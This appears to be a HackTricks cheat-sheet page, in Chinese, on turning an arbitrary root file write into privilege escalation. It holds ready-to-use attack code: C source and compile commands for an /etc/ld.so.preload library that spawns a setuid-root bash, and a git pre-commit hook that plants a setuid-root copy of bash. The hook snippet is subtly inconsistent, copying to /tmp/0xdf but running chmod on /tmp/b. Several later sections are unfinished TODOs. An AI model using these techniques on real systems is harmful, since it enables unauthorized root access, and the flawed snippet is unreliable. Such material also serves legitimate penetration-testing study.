# 任意文件写入根目录

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

此文件的行为类似于 **`LD_PRELOAD`** 环境变量，但它也适用于 **SUID 二进制文件**。\
如果您可以创建或修改它，您可以简单地添加一个 **将在每个执行的二进制文件中加载的库的路径**。

例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) 是 **脚本**，在 git 仓库中的各种 **事件** 上 **运行**，例如当创建提交、合并时... 所以如果一个 **特权脚本或用户** 经常执行这些操作，并且可以 **写入 `.git` 文件夹**，这可以被用来 **privesc**。

例如，可以在 git 仓库的 **`.git/hooks`** 中 **生成一个脚本**，以便在创建新提交时始终执行：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

位于 `/proc/sys/fs/binfmt_misc` 的文件指示哪个二进制文件应该执行哪种类型的文件。TODO: 检查滥用此功能以在打开常见文件类型时执行反向 shell 的要求。

{{#include ../../banners/hacktricks-training.md}}
